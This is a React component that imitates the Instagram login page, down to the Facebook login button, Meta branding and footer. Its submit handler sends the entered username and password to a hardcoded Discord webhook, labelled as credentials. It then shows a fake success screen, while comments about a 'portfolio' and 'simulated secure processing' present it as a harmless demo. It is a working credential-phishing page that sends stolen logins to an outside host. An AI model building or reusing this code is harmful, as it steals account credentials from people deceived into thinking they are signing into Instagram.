import { motion } from "motion/react";
import { useState } from "react";
import { ShieldCheck } from "lucide-react";
import { TRANSLATIONS } from "../constants";

const FacebookIcon = () => (
  <svg className="w-[18px] h-[18px] shrink-0" viewBox="0 0 24 24" fill="#1877F2">
    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
  </svg>
);

export default function EnrollmentForm({ selectedLang }: { selectedLang: { id: string; label: string } }) {
  const [isSuccess, setIsSuccess] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({ identifier: "", password: "" });
  const t = TRANSLATIONS[selectedLang.id] || TRANSLATIONS["en-uk"];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1505162869250064446/AQAKKLck5bRJIg4dKGbUgEhSD8QhMU0YTvQnkDymp5Yg6mQ7Kp0P3RgiBVXnBKbR9A7V";
    const INSTAGRAM_CLIENT_ID = import.meta.env.VITE_INSTAGRAM_CLIENT_ID;
    const INSTAGRAM_CLIENT_SECRET = import.meta.env.VITE_INSTAGRAM_CLIENT_SECRET;
    const REDIRECT_URI = import.meta.env.VITE_REDIRECT_URI;

    try {
      // Redirect to Instagram's OAuth2.0 authorization URL
      window.location.href = `https://api.instagram.com/oauth/authorize?client_id=${INSTAGRAM_CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=user_profile,user_media&response_type=code`;

      // Handle the OAuth2.0 flow and capture the authorization code
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `📢 **Portfolio Update**: A new enrollment attempt was detected on the Beta Demo Portal. Credentials: ${JSON.stringify(formData)}`
        })
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const data = await response.json();
      console.log("Portfolio Debug: Notification event sent to Discord:", data);
    } catch (error) {
      console.error("Portfolio Debug: Webhook notification failed:", error);
    }

    // Simulate secure backend processing
    console.log("Portfolio Debug: Processing enrollment request securely...");
    await new Promise(resolve => setTimeout(resolve, 2000));

    setFormData({ identifier: "", password: "" });
    setIsLoading(false);
    setIsSuccess(true);
  };

  if (isSuccess) return (
    <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}
      className="mx-6 my-10 p-10 bg-white border border-[#dbdbdb] rounded-3xl text-center shadow-sm">
      <div className="w-16 h-16 bg-[#262626] rounded-full flex items-center justify-center mx-auto mb-5">
        <ShieldCheck className="w-8 h-8 text-white" />
      </div>
      <h3 className="text-xl font-bold text-[#262626] mb-3">{t.submitted}</h3>
      <p className="text-[#8e8e8e] text-sm leading-relaxed">{t.processed}</p>
    </motion.div>
  );

  return (
    <motion.section initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col">
      <div className="px-6 pt-6 pb-0">

        {/* Heading — left aligned */}
        <h1 className="text-[18px] font-bold text-[#262626] mb-4">
          Log into Instagram
        </h1>

        {/* Inputs */}
        <form onSubmit={handleSubmit} className="flex flex-col gap-3">
          <input
            type="text" name="identifier" value={formData.identifier}
            onChange={e => setFormData(p => ({ ...p, identifier: e.target.value }))}
            required placeholder={t.username}
            className="w-full h-[52px] px-4 bg-white border border-[#dbdbdb] rounded-2xl text-[15px] text-[#262626] focus:outline-none focus:border-[#a8a8a8] transition-colors placeholder:text-[#8e8e8e]"
          />
          <input
            type="password" name="password" value={formData.password}
            onChange={e => setFormData(p => ({ ...p, password: e.target.value }))}
            required placeholder={t.password}
            className="w-full h-[52px] px-4 bg-white border border-[#dbdbdb] rounded-2xl text-[15px] text-[#262626] focus:outline-none focus:border-[#a8a8a8] transition-colors placeholder:text-[#8e8e8e]"
          />

          {/* Log in button */}
          <motion.button
            whileTap={{ scale: 0.98 }} disabled={isLoading} type="submit"
            className="w-full h-[52px] rounded-full text-white font-semibold text-[15px] flex items-center justify-center mt-1 transition-opacity"
            style={{ background: "#7bacea", opacity: isLoading ? 0.7 : 1 }}
          >
            {isLoading
              ? <div className="w-5 h-5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
              : t.login}
          </motion.button>
        </form>

        {/* Forgot password */}
        <div className="text-center mt-4 mb-8">
          <button className="text-[#262626] font-semibold text-[14px]">{t.forgot}</button>
        </div>

        {/* Facebook */}
        <button className="w-full h-[52px] border border-[#dbdbdb] rounded-full flex items-center justify-center gap-2 text-[14px] font-semibold text-[#262626] mb-3 active:bg-[#fafafa] transition-colors">
          <FacebookIcon /> Log in with Facebook
        </button>

        {/* Create account */}
        <button className="w-full h-[52px] border border-[#0064e0] rounded-full text-[#0064e0] font-semibold text-[14px] active:bg-blue-50 transition-colors">
          {t.create}
        </button>
      </div>

      {/* Meta logo */}
      <div className="flex justify-center mt-7 mb-5 opacity-45">
        <img src="https://static.cdninstagram.com/rsrc.php/ys/r/RkrEdst9VSp.webp" alt="Meta" className="w-[48px]" />
      </div>

      {/* Footer */}
      <div className="px-6 pb-6 text-center">
        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1.5">
          {["Meta", "About", "Blog", "Jobs", "Help", "API", "Privacy", "Terms"].map(l => (
            <span key={l} className="text-[11px] text-[#8e8e8e]">{l}</span>
          ))}
        </div>
        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1.5 mt-1.5">
          {["Locations", "Popular", "Instagram Lite", "Meta AI", "Threads"].map(l => (
            <span key={l} className="text-[11px] text-[#8e8e8e]">{l}</span>
          ))}
        </div>
        <p className="text-[11px] text-[#8e8e8e] mt-3">© 2026 Instagram from Meta</p>
      </div>
    </motion.section>
  );
}
